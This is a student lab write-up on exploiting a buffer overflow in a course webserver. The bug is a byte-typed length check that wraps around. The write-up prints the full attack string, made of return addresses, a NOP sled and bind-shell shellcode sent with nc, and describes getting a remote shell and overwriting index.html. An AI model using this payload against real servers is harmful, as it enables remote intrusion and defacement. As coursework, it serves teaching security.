Short explanation of our method of attack:

Our attack string is the following: echo -e "GET /\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x84\xfe\xff\xbf\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68\x22\xb8\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80 HTTP" | nc 310test.cs.duke.edu 9139

This is 80 return addresses (0xbffffe84), 440 NOPS (0x90), followed by the shellcode specified at http://shell-storm.org/shellcode/files/shellcode-836.php. Different from the shellcode specified in this website, we instead bind our shell to port 8888, not 11111 by default. Total length of the attack string, excluding the "GET /" and the " HTTP" suffix, is 833, which is 320 bytes of return addresses, 440 NOPS and 73 bytes of shellcode.  

Our method of attack is to overwrite the original return address, which is 140 bytes offset of the start of the buffer: filename, with our new return address: 0xbffffe84. We cover the starting portion of our attack string with 80 copies of the new return address because we want to maximize our chancing of overwriting the old return address. We then fill 440 NOPS bytes, which help slide the program counter down to our shellcode should our guess of 0xbffffe84 as where our shellcode would fall is inaccruate. These NOPS also aim at maximizing our chance of guiding the program counter towards our shellcode. 

The vulnerability of webserver.c is the code "byte len" in the method: int check_filename_length(byte len). The type byte can only withstand number as large as 255, or 2^8 -1, so any number that exceeds 255 will be overflowed in binary. Therefore, len of 256 - 355, 512 - 611, 768 - 867 will also be mistakenly valued as less than 100. As a result, our 833-long attack string also passes this length test, and this allows us to overflow the buffer filename, which has only the size of 100 chars. 

Our guess of 0xbffffe84 was a rational guess in that we know that the correct return address must be close to the start of the stack: 0xbfffffff. We just weren't sure how close so we started with 0xbffffe84 and we were lucky.

When we attack our server with the above attack string, our client terminal hangs. We then open a second terminal in our linux Ubuntu x86 (32-bit) VM and send the command: nc -v 310test.cs.duke.edu 8888, which returned a connection success message from the server [Connection to 310test.cs.duke.edu 8888 port [tcp/*] succeeded!]. We then cd into the "www" folder and send the command echo "Hack Success!" > index.html. This modified the server side file: index.html. 

We felt that this project is very educational and we learned a lot. Thank you.

Hayden Bader, Bohan Wu